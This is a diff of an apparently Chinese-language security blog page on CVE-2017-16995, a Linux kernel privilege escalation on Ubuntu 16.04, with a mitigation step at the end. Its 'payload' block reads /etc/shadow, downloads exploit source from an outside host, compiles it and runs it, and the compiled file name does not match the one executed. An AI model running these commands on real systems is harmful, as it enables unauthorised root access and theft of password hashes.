@@ -316,6 +316,7 @@
         <h1 id="CVE-2017-16995-Ubuntu16-04"><a href="#CVE-2017-16995-Ubuntu16-04" class="headerlink" title="CVE-2017-16995 Ubuntu16.04"></a>CVE-2017-16995 Ubuntu16.04</h1><p><strong>影响版本：</strong><br>Linux内核：Linux Kernel Version 4.14 ~ 4.4<br>Ubuntu版本：16.04.01~ 16.04.04</p>
 <p>提权</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">使用cat /proc/version查看Linux内核版本 ：</span><br><span class="line">cat /etc/shadow查看账号密码</span><br><span class="line"></span><br><span class="line">payload:</span><br><span class="line">wget  http://cyseclabs.com/pub/upstream44.c</span><br><span class="line">gcc -o test upstream44.c </span><br><span class="line">chmod +x exp</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
+<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>emmmm  不懂</p>
 <h2 id="修复和缓解建议："><a href="#修复和缓解建议：" class="headerlink" title="修复和缓解建议："></a>修复和缓解建议：</h2><p>目前暂未有明确的补丁升级方案。 建议用户在评估风险后，通过修改内核参数限制普通用户使用bpf(2)系统调用：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo 1 &gt; /proc/sys/kernel/unprivileged_bpf_disabled</span><br></pre></td></tr></table></figure>
       
